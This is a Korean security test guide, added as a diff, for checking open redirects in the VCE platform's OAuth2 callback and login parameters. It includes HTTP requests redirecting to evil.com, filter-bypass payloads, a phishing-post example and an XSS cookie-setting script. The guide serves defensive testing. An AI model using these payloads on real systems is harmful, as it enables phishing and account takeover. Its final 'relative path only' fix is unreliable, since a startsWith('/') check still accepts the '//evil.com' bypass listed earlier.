@@ -1,0 +1,322 @@
+================================================================================
+[VCE-CM-05] 검증되지 않은 리다이렉트와 포워드
+도메인: community
+위험도: High
+================================================================================
+
+1. 진단 항목 개요
+--------------------------------------------------------------------------------
+오픈 리다이렉트(Open Redirect)는 서버가 사용자 제공 URL로 검증 없이 리다이렉트
+처리할 때 발생하는 취약점이다. 신뢰할 수 있는 도메인(vceapp.com)처럼 보이는
+URL로 사용자를 유인한 뒤, 공격자가 제어하는 외부 사이트로 리다이렉트하여
+피싱 또는 자격증명 탈취에 활용된다.
+
+VCE 플랫폼에서의 확정 취약점:
+  - OAuth2SuccessHandler.java:43-55: OAuth2 인증 성공 후 쿠키에 저장된
+    redirect_uri를 검증 없이 사용하여 리다이렉트 처리
+  - 커뮤니티 내 링크에 ?next= 파라미터를 활용한 외부 리다이렉트
+
+공격 시나리오:
+  1. 공격자가 피해자에게 아래 URL을 피싱 이메일로 전송:
+     https://vceapp.com/oauth2/callback?redirect_uri=https://evil.com
+  2. 피해자가 vceapp.com 도메인을 신뢰하고 링크 클릭
+  3. OAuth2 로그인 후 evil.com으로 리다이렉트
+  4. evil.com에서 자격증명 입력 유도 (피싱)
+
+영향 범위:
+  - 계정 탈취를 위한 피싱 사이트 리다이렉트
+  - OAuth2 토큰 탈취
+  - 악성 소프트웨어 다운로드 유도
+  - 클릭재킹과 결합하여 사용자 혼란 유발
+
+
+2. 대상 기능 & 엔드포인트
+--------------------------------------------------------------------------------
+대상 기능:
+  - OAuth2 소셜 로그인 콜백 처리
+  - 커뮤니티 내 게시글 링크 클릭 처리
+  - 로그인 후 원래 페이지로 복귀 (redirect_uri)
+  - 댓글 내 외부 링크
+
+주요 엔드포인트:
+  GET /oauth2/authorization/google    - OAuth2 로그인 시작
+  GET /oauth2/callback/google         - OAuth2 콜백
+  GET /login?redirect_uri={url}       - 로그인 후 리다이렉트
+  GET /api/community/redirect?url={url} - 있을 경우
+
+관련 쿠키:
+  redirect_uri=https://exchange.vceapp.com/community (정상)
+  redirect_uri=https://evil.com (조작)
+
+접근 URL:
+  로컬:   http://localhost:5173
+  운영:   https://exchange.vceapp.com
+
+
+3. 취약점 원리 (Why this works)
+--------------------------------------------------------------------------------
+[OAuth2 쿠키 redirect_uri 취약점]
+OAuth2SuccessHandler.java:43-55 추정 로직:
+
+  String redirectUri = getRedirectUriFromCookie(request);  // 쿠키에서 읽기
+  if (redirectUri == null || redirectUri.isEmpty()) {
+    redirectUri = "https://exchange.vceapp.com";           // 기본값
+  }
+  response.sendRedirect(redirectUri);                      // 검증 없이 리다이렉트
+
+문제점:
+  - 쿠키의 redirect_uri 값을 검증하지 않음
+  - 공격자가 Set-Cookie 헤더를 통해 또는 XSS로 쿠키 조작 가능
+  - OAuth2 로그인 전 공격자가 쿠키 값을 https://evil.com으로 설정
+
+쿠키 조작 방법:
+  1. 브라우저 개발자도구 > Application > Cookies에서 직접 수정
+  2. Burp Suite로 OAuth2 시작 요청 인터셉트 → 쿠키 추가
+  3. XSS 취약점과 연계하여 document.cookie 조작
+
+[next/redirect_uri 파라미터 취약점]
+  URL: https://vceapp.com/login?next=https://evil.com
+  서버 로직:
+    String next = request.getParameter("next");
+    response.sendRedirect(next);  // 검증 없음
+
+
+4. 테스트 절차 (Step-by-step)
+--------------------------------------------------------------------------------
+
+[STEP 1] OAuth2 쿠키 redirect_uri 조작 (핵심 테스트)
+
+1-1. Burp Suite Proxy 활성화
+1-2. 브라우저에서 Google 소셜 로그인 시작:
+     http://localhost:5173/login → "Google로 로그인" 클릭
+1-3. Burp Suite에서 OAuth2 인증 시작 요청 캡처:
+------------------------------------------------------------------------
+GET /oauth2/authorization/google HTTP/1.1
+Host: localhost:8080
+Cookie: JSESSIONID=abc123
+
+------------------------------------------------------------------------
+
+1-4. Forward 전에 Cookie 헤더에 redirect_uri 추가하거나
+     별도 쿠키 조작 요청 전송:
+
+브라우저 개발자도구에서 쿠키 직접 수정:
+  Application > Cookies > localhost:8080
+  redirect_uri 쿠키 값을 https://evil.com으로 변경
+
+1-5. Google 로그인 완료 후 OAuth2 콜백 처리 시 리다이렉트 URL 확인
+
+Burp Repeater - OAuth2 콜백 요청에 조작된 쿠키:
+------------------------------------------------------------------------
+GET /oauth2/callback/google?code=GOOGLE_AUTH_CODE&state=STATE HTTP/1.1
+Host: localhost:8080
+Cookie: redirect_uri=https://evil.com; JSESSIONID=abc123
+
+------------------------------------------------------------------------
+
+기대 결과 (취약):
+  HTTP/1.1 302 Found
+  Location: https://evil.com
+
+기대 결과 (안전):
+  HTTP/1.1 302 Found
+  Location: https://exchange.vceapp.com (기본값으로 대체)
+
+[STEP 2] 로그인 redirect_uri 파라미터 조작
+
+Burp Repeater:
+------------------------------------------------------------------------
+GET /login?redirect_uri=https://evil.com HTTP/1.1
+Host: localhost:8080
+
+------------------------------------------------------------------------
+
+다양한 파라미터명 시도:
+------------------------------------------------------------------------
+GET /login?next=https://evil.com HTTP/1.1
+Host: localhost:8080
+
+------------------------------------------------------------------------
+------------------------------------------------------------------------
+GET /login?returnUrl=https://evil.com HTTP/1.1
+Host: localhost:8080
+
+------------------------------------------------------------------------
+------------------------------------------------------------------------
+GET /login?return_to=https://evil.com HTTP/1.1
+Host: localhost:8080
+
+------------------------------------------------------------------------
+------------------------------------------------------------------------
+GET /login?goto=https://evil.com HTTP/1.1
+Host: localhost:8080
+
+------------------------------------------------------------------------
+
+[STEP 3] 우회 기법 테스트
+
+허용된 도메인 검사가 있는 경우 우회:
+
+프로토콜 생략:
+------------------------------------------------------------------------
+GET /login?next=//evil.com HTTP/1.1
+Host: localhost:8080
+
+------------------------------------------------------------------------
+
+URL 인코딩 우회:
+------------------------------------------------------------------------
+GET /login?next=%68%74%74%70%73%3A%2F%2Fevil.com HTTP/1.1
+Host: localhost:8080
+
+------------------------------------------------------------------------
+
+도메인 포함 우회 (vceapp.com을 포함하되 실제 destination은 evil.com):
+------------------------------------------------------------------------
+GET /login?next=https://evil.com?vceapp.com HTTP/1.1
+Host: localhost:8080
+
+------------------------------------------------------------------------
+------------------------------------------------------------------------
+GET /login?next=https://evil.com#vceapp.com HTTP/1.1
+Host: localhost:8080
+
+------------------------------------------------------------------------
+------------------------------------------------------------------------
+GET /login?next=https://vceapp.com.evil.com HTTP/1.1
+Host: localhost:8080
+
+------------------------------------------------------------------------
+
+CRLF 인젝션 우회:
+------------------------------------------------------------------------
+GET /login?next=https://evil.com%0d%0a HTTP/1.1
+Host: localhost:8080
+
+------------------------------------------------------------------------
+
+[STEP 4] 게시글 내 링크를 통한 오픈 리다이렉트
+
+게시글에 악성 리다이렉트 URL 삽입:
+------------------------------------------------------------------------
+POST /api/community/posts HTTP/1.1
+Host: localhost:8080
+Content-Type: application/json
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
+
+{
+  "title": "중요 공지: 시스템 점검 안내",
+  "content": "아래 링크에서 인증을 완료해주세요: <a href='http://localhost:8080/login?next=https://evil-phishing.com'>여기를 클릭</a>",
+  "categoryId": 1
+}
+------------------------------------------------------------------------
+
+피해자가 해당 링크 클릭 시:
+  1. VCE 로그인 페이지로 이동 (정상처럼 보임)
+  2. 로그인 완료 후 evil-phishing.com으로 리다이렉트
+  3. 피해자가 VCE와 동일하게 생긴 피싱 사이트에서 자격증명 재입력
+
+[STEP 5] XSS와 결합한 오픈 리다이렉트 (심화)
+
+XSS로 쿠키 내 redirect_uri 조작:
+------------------------------------------------------------------------
+POST /api/community/posts HTTP/1.1
+Host: localhost:8080
+Content-Type: application/json
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
+
+{
+  "title": "XSS + 오픈 리다이렉트 연계",
+  "content": "<script>document.cookie='redirect_uri=https://evil.com;path=/;domain=localhost'</script>",
+  "categoryId": 1
+}
+------------------------------------------------------------------------
+
+[STEP 6] 리다이렉트 응답 헤더 분석
+
+Burp Suite History에서 302 응답 필터링:
+  - Filter > Status Code: 302, 301, 307, 308
+  - Location 헤더 값 확인
+  - 외부 도메인(exchange.vceapp.com이 아닌 곳)으로의 리다이렉트 여부 확인
+
+개발자도구 Network 탭:
+  - "Redirect" 필터 적용
+  - Location 헤더 및 최종 URL 비교
+
+
+5. 취약 여부 판단 기준
+--------------------------------------------------------------------------------
+취약 (아래 중 하나라도 해당):
+  - redirect_uri 쿠키를 https://evil.com으로 변경 후 로그인 시
+    Location: https://evil.com 응답 수신
+  - ?next=, ?redirect_uri= 파라미터로 외부 도메인 리다이렉트 성공
+  - URL 인코딩/우회 기법으로 외부 도메인 리다이렉트 성공
+  - 도메인 검증이 있더라도 서브도메인 트릭(vceapp.com.evil.com)으로 우회 성공
+
+안전 (아래 모두 해당 시):
+  - redirect_uri를 외부 도메인으로 설정 시 기본값(exchange.vceapp.com)으로 대체
+  - 화이트리스트 검증: exchange.vceapp.com 등 허용 도메인 목록만 허용
+  - 외부 도메인 리다이렉트 시 400 Bad Request 반환
+  - Location 헤더가 항상 내부 도메인만 반환
+
+
+6. 예상 취약 포인트 (코드 위치)
+--------------------------------------------------------------------------------
+파일: backend/src/main/java/.../security/OAuth2SuccessHandler.java
+라인: 43-55
+
+취약 코드 (추정):
+  @Override
+  public void onAuthenticationSuccess(HttpServletRequest request,
+      HttpServletResponse response, Authentication authentication)
+      throws IOException {
+
+    // 라인 43-55: 쿠키에서 redirect_uri를 읽어 검증 없이 리다이렉트
+    String redirectUri = cookieUtils.getCookie(request, "redirect_uri")
+                                    .map(Cookie::getValue)
+                                    .orElse("/");
+    cookieUtils.deleteCookie(request, response, "redirect_uri");
+    response.sendRedirect(redirectUri);  // 검증 없음!
+  }
+
+파일: backend/src/main/java/.../security/SecurityConfig.java
+  - OAuth2 설정에서 redirect_uri 허용 도메인 미설정
+
+
+7. 권고 조치
+--------------------------------------------------------------------------------
+[즉시 적용 - 화이트리스트 검증]
+
+// OAuth2SuccessHandler.java 수정
+private static final List<String> ALLOWED_REDIRECT_HOSTS = Arrays.asList(
+    "exchange.vceapp.com",
+    "localhost"
+);
+
+private String validateRedirectUri(String redirectUri) {
+    try {
+        URI uri = new URI(redirectUri);
+        String host = uri.getHost();
+        if (ALLOWED_REDIRECT_HOSTS.contains(host)) {
+            return redirectUri;
+        }
+    } catch (URISyntaxException e) {
+        // 잘못된 URI
+    }
+    return "https://exchange.vceapp.com";  // 기본값으로 대체
+}
+
+// 사용:
+String redirectUri = validateRedirectUri(rawRedirectUri);
+response.sendRedirect(redirectUri);
+
+[추가 권고]
+1. redirect_uri 쿠키 대신 상태 파라미터(state)에 암호화하여 전달
+2. 쿠키에 SameSite=Strict 설정으로 외부 사이트에서의 쿠키 조작 방지
+3. 절대 경로(relative path)만 허용하는 방법:
+   if (redirectUri.startsWith("/")) { // 상대 경로만 허용
+     response.sendRedirect(redirectUri);
+   }
+4. OAuth2 registered_redirect_uris에 허용 URI 명시적 등록
+
+================================================================================
